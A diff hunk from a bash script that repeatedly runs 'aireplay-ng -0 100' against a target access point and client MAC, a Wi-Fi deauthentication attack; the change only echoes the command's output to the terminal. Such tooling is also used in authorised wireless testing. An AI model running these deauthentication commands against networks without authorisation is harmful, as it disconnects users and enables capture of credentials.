@@ -195,7 +195,7 @@ while true; do
                 [Yy]*)
                     printf "Running aireplay-ng again...\n"
                     clear
-                    aireloopout=$(sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF)
+                    aireloopout=$(sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee /dev/tty)
                     printf "$aireloopout\n"
                     if ! echo "$aireloopout" | grep -q "No such BSSID available"; then
                         break
